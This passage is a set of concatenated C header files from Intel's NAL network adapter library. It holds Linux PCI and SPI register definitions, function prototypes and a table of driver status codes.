    ((UINT8*)_dest)[1] = ((UINT8*)_src)[6]; \
    ((UINT8*)_dest)[2] = ((UINT8*)_src)[5]; \
    ((UINT8*)_dest)[3] = ((UINT8*)_src)[4]; \
    ((UINT8*)_dest)[4] = ((UINT8*)_src)[3]; \
    ((UINT8*)_dest)[5] = ((UINT8*)_src)[2]; \
    ((UINT8*)_dest)[6] = ((UINT8*)_src)[1]; \
    ((UINT8*)_dest)[7] = ((UINT8*)_src)[0]; \
}

#define WORD_SWAP(dword) WORD_SWAP_DWORD(dword)

#define BYTE_SWAP(word) BYTE_SWAP_WORD(word)
#endif

#include "naltypes.h"
#include "nalcodes.h"
#include <linuxnalioctl.h>
#include <hwbus_t.h>

#ifndef NAL_DRIVER
#include <linuxnallibrary.h>
#endif

NAL_STATUS
NalInitializeOs(VOID);

NAL_STATUS
NalExitOs(VOID);

KVOID*
NalKMemset(
    IN KVOID* Dest,
    IN int Value,
    IN UINTN Size
    );

VOID*
NalKtoUMemcpy(
    IN VOID* Dest,
    IN KVOID* Source,
    IN UINTN Size
    );

KVOID*
NalKtoKMemcpy(
    IN KVOID* Dest,
    IN KVOID* Source,
    IN UINTN Size
    );

KVOID*
NalUtoKMemcpy(
    IN KVOID* Dest,
    IN VOID* Source,
    IN UINTN Size
    );

BOOLEAN
_NalIsAdapterInUse(
    IN NAL_DEVICE_LOCATION NalDevice
    );

#endif

```

`source/IntelNal/inc/linux/linuxpci_i.h`:

```h
/*

  This file is provided under a dual BSD/GPLv2 license.  When using or
  redistributing this file, you may do so under either license.

  GPL LICENSE SUMMARY

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.

  This program is free software; you can redistribute it and/or modify
  it under the terms of version 2 of the GNU General Public License as
  published by the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but
  WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
  The full GNU General Public License is included in this distribution
  in the file called LICENSE.GPL.

  Contact Information:
  e1000-devel Mailing List <e1000-devel@lists.sourceforge.net>
  Intel Corporation, 5200 N.E. Elam Young Parkway, Hillsboro, OR 97124-6497

  BSD LICENSE

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.
  All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions
  are met:

    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in
      the documentation and/or other materials provided with the
      distribution.
    * Neither the name of Intel Corporation nor the names of its
      contributors may be used to endorse or promote products derived
      from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*/

/*
 *
 * Module Name:
 *   linuxpci_i.h
 *
 *  Abstract:
 *   This file contains Linux specific prototypes & variable types
 *
 */


#include "hwbus_t.h"

#ifndef _LINUX_PCIINTERFACE_H_
#define _LINUX_PCIINTERFACE_H_

#define MAX_SEGMENTS 0xFF
#define MAX_BUSES 256
#define MAX_DEVICES 32
#define MAX_FUNCTIONS 8
#define NAL_NO_PCI_BUS 0
#define NAL_NO_DEVICE 2

/* BYT Security checking additions */
#define INTEL_VENDOR_ID                   0x8086  // Intel(R) vendor ID

/*	SPI device BDF: */
#define LPC_PCI_BUSNUMBER        0
#define LPC_PCI_DEVICEID         31
#define LPC_PCI_FUNCTION         0
#define LPC_SBASE_REG_OFFSET     0x54

/*      Pbase register offset  */
#define LPC_PBASE_REG_OFFSET     0x44

/*Only allow READ access to following SPI device data registers after MFG mode is set:
	SPI data registers, it is used as mapped mem access, so need to figure out how in kernel knows the
 mapped mem is in this range:
FDATA[N] - Flash Data N
31:00 RW   0x0 Flash Data N (FD[N]):
*/

#define SPI_MAX_READ_WRITE_SIZE              64

#define SPI_FDATA0_OFFSET                    0x10
#define SPI_FDATA1_OFFSET                    0x14
#define SPI_FDATA2_OFFSET                    0x18
#define SPI_FDATA3_OFFSET                    0x1C
#define SPI_FDATA4_OFFSET                    0x20
#define SPI_FDATA5_OFFSET                    0x24
#define SPI_FDATA6_OFFSET                    0x28
#define SPI_FDATA7_OFFSET                    0x2C
#define SPI_FDATA8_OFFSET                    0x30
#define SPI_FDATA9_OFFSET                    0x34
#define SPI_FDATA10_OFFSET                   0x38
#define SPI_FDATA11_OFFSET                   0x3C
#define SPI_FDATA12_OFFSET                   0x40
#define SPI_FDATA13_OFFSET                   0x44
#define SPI_FDATA14_OFFSET                   0x48
#define SPI_FDATA15_OFFSET                   0x4C

#define SPI_FPBA_OFFSET                      0xD0  /* FPB address, the last SPI register offset */

#define MAX_SPI_REG_OFFSET                   0xFC

/* Following function can check if MFG mode is set:
*/
#define HECI_PCI_BUSNUMBER        0
#define HECI_PCI_DEVICEID         26
#define HECI_PCI_FUNCTION         0

#define ME_PCI_FWSTATUS_REG            0x40
#define ME_PCI_FWSTATUS_MFG_DONE       0x10


BOOLEAN _NalIsBytMfgModeDoneSet(VOID);
BOOLEAN _NalIsBytPciDevices(IN NAL_PHYSICAL_ADDRESS PhysicalAddress);

UINT16
_NalReadPciDeviceCount(VOID);

NAL_STATUS
_NalReadPciDevice(
    OUT NAL_DEVICE_LOCATION* PciLocations,
    IN OUT UINT16* Count
    );

NAL_STATUS
_NalReadPciDeviceScanPci(
    OUT NAL_DEVICE_LOCATION* PciLocations,
    IN OUT UINT16* Count
    );

NAL_STATUS
_NalFillPciConfigSpec(
    IN NAL_DEVICE_LOCATION PciLocation,
    OUT PCI_DEVICE* Device,
    IN UINT32 DwordCount
    );

NAL_STATUS
_NalOSReadPciConfig32(
    IN NAL_DEVICE_LOCATION PciLocation,
    IN UINT32 DwordNumber,
    OUT UINT32* Value
    );

NAL_STATUS
_NalOSWritePciConfig32(
    IN NAL_DEVICE_LOCATION PciLocation,
    IN UINT32 DwordNumber,
    IN UINT32 Data
    );

NAL_STATUS
_NalOSWritePciConfigVariable(
    IN NAL_DEVICE_LOCATION PciLocation,
    IN UINT32 DwordNumber,
    IN UINT8 ByteMask,
    IN UINT32 Data
    );

NAL_STATUS
_NalEnablePciDevice(
    IN NAL_DEVICE_LOCATION DeviceLocation
    );

NAL_STATUS
_NalOSReadPciExConfig32(
    IN NAL_DEVICE_LOCATION PciLocation,
    IN UINT32 DwordNumber,
    OUT UINT32* Value
    );

NAL_STATUS
_NalOSWritePciExConfig32(
    IN NAL_DEVICE_LOCATION PciLocation,
    IN UINT32 DwordNumber,
    IN UINT32 Data
    );

NAL_STATUS
_NalOsWritePciExConfigSpace(
    IN NAL_DEVICE_LOCATION DeviceLocation,
    IN UINT32 ByteOffset,
    IN UINT32 NoOfBytes,
    IN UINT8* Data
    );

NAL_STATUS
_NalOsReadPciExConfigSpace(
    IN NAL_DEVICE_LOCATION DeviceLocation,
    IN UINT32 ByteIndex,
    IN UINT32 NoOfBytes,
    OUT UINT8* Value
    );

NAL_STATUS
_NalOsWritePciExByte(
    IN NAL_DEVICE_LOCATION DeviceLocation,
    IN UINT32 ByteOffset,
    IN UINT8 Data
    );

NAL_STATUS
_NalOsReadPciExByte(
    IN NAL_DEVICE_LOCATION DeviceLocation,
    IN UINT32 ByteIndex,
    OUT UINT8* Value
    );

NAL_STATUS
_NalReadPciDeviceSysfs(
        OUT NAL_DEVICE_LOCATION* PciLocations,
        IN OUT UINT16* Count
        );

NAL_STATUS
_NalOSReadPciConfig32Sysfs(
    IN NAL_DEVICE_LOCATION PciLocation,
    IN UINT32 DwordNumber,
    OUT UINT32* Value
    );

NAL_STATUS
_NalOSReadPciConfigSpaceSysfs(
    IN NAL_DEVICE_LOCATION PciLocation,
    IN UINT32 DwordCount,
    OUT UINT32* Value
    );

NAL_STATUS
_NalOsPciDeviceEnableSysfs(
        IN NAL_DEVICE_LOCATION PciLocation
        );

NAL_STATUS
_NalOsPciDeviceDisableSysfs(
        IN NAL_DEVICE_LOCATION PciLocation
        );

#endif

```

`source/IntelNal/inc/nal.h`:

```h
/*

  This file is provided under a dual BSD/GPLv2 license.  When using or
  redistributing this file, you may do so under either license.

  GPL LICENSE SUMMARY

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.

  This program is free software; you can redistribute it and/or modify
  it under the terms of version 2 of the GNU General Public License as
  published by the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but
  WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
  The full GNU General Public License is included in this distribution
  in the file called LICENSE.GPL.

  Contact Information:
  e1000-devel Mailing List <e1000-devel@lists.sourceforge.net>
  Intel Corporation, 5200 N.E. Elam Young Parkway, Hillsboro, OR 97124-6497

  BSD LICENSE

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.
  All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions
  are met:

    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in
      the documentation and/or other materials provided with the
      distribution.
    * Neither the name of Intel Corporation nor the names of its
      contributors may be used to endorse or promote products derived
      from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*/

/*
 *
 * Module Name:
 *   nal.h
 *
 * Abstract:
 *   This file provides a mechanism for apps to include only this file
 *   in order to use the NAL libraries.
 *
 */


#ifndef _NAL_H_
#define _NAL_H_

#ifdef __cplusplus
extern "C" {
#endif

#ifndef NAL
#define NAL
#endif

#include <naltypes.h>
#include <nalcodes.h>
#include <pci_t.h>
#include <pci_i.h>
#include <os_i.h>
#ifndef NAL_LINUX_ANDROID
#include <pciexp_i.h>
#include <device_i.h>
#include <hwbus_i.h>
#include <nalmodules.h>
#include <nalflash.h>
#include <nalicsp.h>
#include <nalbypass.h>
#endif
#ifdef __cplusplus
}
#endif

#endif

```

`source/IntelNal/inc/nalcodes.h`:

```h
/*

  This file is provided under a dual BSD/GPLv2 license.  When using or
  redistributing this file, you may do so under either license.

  GPL LICENSE SUMMARY

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.

  This program is free software; you can redistribute it and/or modify
  it under the terms of version 2 of the GNU General Public License as
  published by the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but
  WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
  The full GNU General Public License is included in this distribution
  in the file called LICENSE.GPL.

  Contact Information:
  e1000-devel Mailing List <e1000-devel@lists.sourceforge.net>
  Intel Corporation, 5200 N.E. Elam Young Parkway, Hillsboro, OR 97124-6497

  BSD LICENSE

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.
  All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions
  are met:

    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in
      the documentation and/or other materials provided with the
      distribution.
    * Neither the name of Intel Corporation nor the names of its
      contributors may be used to endorse or promote products derived
      from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*/

/*
 *
 * Module Name:
 *   nalcodes.h
 *
 * Abstract:
 *   This file contains the status codes.
 *
 */


#ifndef _NALCODES_H_
#define _NALCODES_H_

#include <naltypes.h>

#define NAL_CODE_SUCCESS 0x0
#define NAL_CODE_INFORMATIONAL 0x1
#define NAL_CODE_WARNING 0x2
#define NAL_CODE_ERROR 0x3

#define OEM_NONE 0x00
#define OEM_INTEL 0x86

#define CODE_GENERAL 0x0
#define CODE_NAL 0xA

#define MAKE_STATUS_CODE(type,custom,status) \
    ((UINT32)(((UINT32)(type)<<30) | \
    ((UINT32)(OEM_INTEL)<<20) | \
    ((UINT32)(custom)<<16) | \
    ((UINT32)(status))))

#ifdef NAL_DRIVER
#define NalMakeCode(_Type,_Library,_Number,_Description) MAKE_STATUS_CODE(_Type, _Library, _Number)
#else

typedef UINT32 NAL_LINK_MODE;

#define NAL_MAX_CODES 1000

typedef struct _NAL_CODE_STRUCT
{
    BOOLEAN InUse;
    UINT32 Status;
    CHAR* Description;
} NAL_CODE_STRUCT;

extern NAL_CODE_STRUCT Global_CodeStruct[NAL_MAX_CODES];

NAL_STATUS
NalMakeCode(
    IN UINT32 Type,
    IN UINT32 Library,
    IN UINT32 Number,
    IN CHAR* Description
    );

CHAR*
NalGetStatusCodeDescription(
    IN NAL_STATUS Status
    );

#endif

#define NAL_SUCCESS 0
#define NAL_INVALID_PARAMETER 1
#define NAL_NOT_ENOUGH_SPACE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x0002, "Not enough space")
#define NAL_NOT_IMPLEMENTED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x0003, "Not Implemented")
#define NAL_TIMEOUT_ERROR NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x0004, "Timeout Error")
#define NAL_NOT_ENABLED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x0005, "Feature not enabled in HW")
#define NAL_CONFIGURATION_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x0006, "Configuration failed")
#define NAL_AQ_COMMAND_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x0007, "Admin Queue command failed")
#define NAL_AQ_COMMAND_TIMEOUT NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x0008, "Admin Queue command timeout")

#define NAL_INITIALIZATION_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8001, "Initialization Failed")
#define NAL_IO_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8002, "IO Failure")
#define NAL_MMAP_ADDRESS_IN_USE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8003, "Memory Map Address In Use")
#define NAL_MMAP_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8004, "Memory Mapping Failed")
#define NAL_MMAP_ADDRESS_NOT_MAPPED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8005, "Memory Map Address Not Mapped")
#define NAL_INVALID_VECTOR NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8006, "Invalid IRQ Vector")
#define NAL_VECTOR_INITIALIZATION_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8007, "IRQ Vector Init Failed")
#define NAL_SPINLOCK_FAILURE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8008, "Spinlock Failure")
#define NAL_SECURITY_ACCESS_DENIED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8009, "Access Denied")
#define NAL_DEBUGPRINT_NO_SUPPORT NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x800A, "No Debug Print Support")
#define NAL_DEBUGPRINT_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x800B, "Debug Print Failed")
#define NAL_TIMER_CALLBACK_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x800C, "Timer Callback Failed")
#define NAL_MEMORY_BAR_INVALID NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x800E, "No PCI memory resources assigned by BIOS or OS!")
#define NAL_INCORRECT_OS NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x800F, "Incorrect OS")
#define NAL_NO_DEBUG_STACK_SPACE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8010, "Debug Stack Space Is Full")
#define NAL_THREAD_CREATE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8011, "Failed to Create Thread")
#define NAL_INITIALIZATION_BASE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8012, "Initialization Failed. Please unload device driver")
#define NAL_INITIALIZATION_DLM_BASE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8013, "Initialization in DLM Failed. Not capable device driver")

#define NAL_PCISCANBUS_NOT_ENOUGH_SPACE NAL_NOT_ENOUGH_SPACE
#define NAL_INVALID_PCI_SLOT_ID NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x4002, "Invalid PCI Slot")
#define NAL_PCICONFIG_NOT_AVAILABLE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x4003, "PCI Config is not available")
#define NAL_NOT_A_VALID_SLOT NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x4006, "Not a valid PCI slot")
#define NAL_NOT_A_VALID_BUS NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x4007, "Invalid bus")
#define NAL_PCI_CAPABILITY_NOT_FOUND NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x4008, "PCI Capability not found")
#define NAL_IO_CALL_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x4009, "IO Driver Call failed")
#define NAL_DMA_NOT_SUPPORTED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x4010, "No usable DMA configuration")
#define NAL_PCI_D3_STATE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x4011, "PCI Device in D3 state")

#define NAL_INVALID_ADAPTER_HANDLE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2001, "Adapter handle is invalid")
#define NAL_ADAPTER_INITIALIZATION_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2002, "Adapter initialization failed")
#define NAL_ADAPTER_START_REQUIRED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2003, "Adapter start required for this operation")
#define NAL_ADAPTER_STOP_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2004, "Adapter stop failed")
#define NAL_ADAPTER_RESET_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2005, "Adapter reset failed")
#define NAL_INVALID_MAC_REGISTER NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2006, "Invalid MAC register")
#define NAL_INVALID_PHY_REGISTER NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2007, "Invalid PHY register")
#define NAL_NO_LINK NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2008, "Adapter has no link")
#define NAL_EEPROM_DOES_NOT_EXIST NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2009, "Adapter has no EEPROM")
#define NAL_EEPROM_BAD_INDEX NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x200A, "EEPROM index is bad or out of range")
#define NAL_EEPROM_BAD_IMAGE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x200B, "EEPROM image is bad")
#define NAL_EEPROM_WRITE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x200C, "EEPROM write failure")
#define NAL_FLASH_DOES_NOT_EXIST NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x200D, "Flash does not exist")
#define NAL_FLASH_ID_UNKNOWN NalMakeCode(NAL_CODE_SUCCESS, CODE_NAL, 0x200E,"Flash ID is unknown")
#define NAL_FLASH_BAD_INDEX NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x200F, "Flash index is bad or our of range")
#define NAL_FLASH_BAD_IMAGE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2010, "Flash image is bad")
#define NAL_FLASH_WRITE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2011, "Flash write failed")
#define NAL_FLASH_READ_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2011, "Flash read failed")
#define NAL_ADAPTER_HANDLE_IN_USE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2012, "Adapter handle is in use")
#define NAL_RESOURCE_ALLOCATION_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2013, "Resource allocation failed")
#define NAL_RESOURCE_NOT_AVAILABLE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2014, "Resource is unavailable")
#define NAL_CONNECTION_TO_DRIVER_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2015, "Connection to driver failed")
#define NAL_DRIVER_HANDLE_INVALID NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2016, "Invalid Driver Handle")
#define NAL_DRIVER_IOCTL_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2017, "IOCTL to driver failed")
#define NAL_IOCTL_INVALID_FUNCTION_ID NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2018, "IOCTL to invalid function ID")
#define NAL_HARDWARE_FAILURE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2019, "Hardware Failure")
#define NAL_ADAPTER_IN_USE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x201A, "Adapter is already in use")
#define NAL_EEPROM_SIZE_INCORRECT NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x201B, "EEPROM size is incorrect")
#define NAL_HOST_IF_COMMAND_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x201C, "Host interface command failure")
#define NAL_WRITE_EEPROM_SIZE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x201D, "Writing of EEPROM size failed")
#define NAL_NO_MODULE_VALIDITY_SIGNATURE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x201E, "Module does not contain validity signature")
#define NAL_WRONG_MODULE_FOR_DEVICE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x201F, "This module does not support this device")
#define NAL_DEVICE_DRIVER_UNLOAD_REQUIRED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2020, "OS Device driver must be unloaded for this operation")
#define NAL_DEVICE_DRIVER_RELOAD_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2021, "The OS device driver could not be reloaded")
#define NAL_PACKET_SIZE_TOO_LARGE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2022, "The packet size is too large for this adapter")
#define NAL_NO_RECEIVE_PENDING NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2023, "No receive is pending")
#define NAL_TRANSMIT_TIMEOUT NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2024, "Transmit packet timed out")
#define NAL_ERASE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2025, "Flash could not be erased")
#define NAL_ADAPTER_DOES_NOT_SUPPORT NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2026, "The adapter does not support this feature")
#define NAL_HEAD_WRITEBACK_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2027, "Head Writeback failed")
#define NAL_ADAPTER_IN_USE_ISCSI NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2028, "Adapter is in use for iSCSI and cannot be initialized")
#define NAL_EEPROM_READ_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2029, "Failed to read EEPROM or EEPROM image.")
#define NAL_EEPROM_CALCULATION_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x202A, "Failed to calculate Manageability CRC/Checksum.")
#define NAL_EEPROM_ASF1_CRC_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x202B, "ASF1 CRC validation failed.")
#define NAL_EEPROM_ASF2_CSUM_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x202C, "ASF2 Checksum validation failed.")
#define NAL_EEPROM_ASF2_CRC_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x202D, "Failed to calculate Manageability CRC/Checksum.")
#define NAL_RESOURCE_LESS_THAN_REQUESTED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x202E, "Resource allocation succeeded but allocated less than requested.")
#define NAL_REGISTER_CHECK_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x202F, "The register test for some value failed." )
#define NAL_TIMESYNC_NO_TIMESTAMP NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2030, "No timestamp found")
#define NAL_FLASH_IS_NOT_MAPPED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2031, "Flash is not mapped in the memory BAR")
#define NAL_HMC_NOT_INITIALIZED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2032, "HMC is not initialized")
#define NAL_HMC_PAGE_NOT_ALLOCATED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2033, "Requested HMC page is not allocated")
#define NAL_HMC_PAGE_NOT_VALID NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2034, "Requested HMC page is not marked valid")
#define NAL_FLASH_REGION_PROTECTED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2035, "Flash region protected")
#define NAL_FLASH_REGION_EMPTY NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2036, "Flash region empty")
#define NAL_EEPROM_MERGE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2037, "Cannot merge EEPROM images")
#define NAL_EEPROM_POINTERS_CORRUPTED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2038, "Pointers in Shadow RAM are corrupted")
#define NAL_FLASH_AUTHENTICATION_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2039, "FLASH image authentication failed")
#define NAL_FLASH_FW_AUTHENTICATION_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x203A, "Current firmware authentication failed - try performing full power cycle")
#define NAL_FLASH_FW_AUTHENTICATION_TIMEOUT NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x203B, "Firmware authentication timeout")
#define NAL_MPHY_READ_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x203C, "mPHY reading failed")
#define NAL_MPHY_WRITE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x203D, "mPHY writing failed")
#define NAL_EEPROM_RO_WORD_WRITE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x203E, "Attempt to write RO word failed")
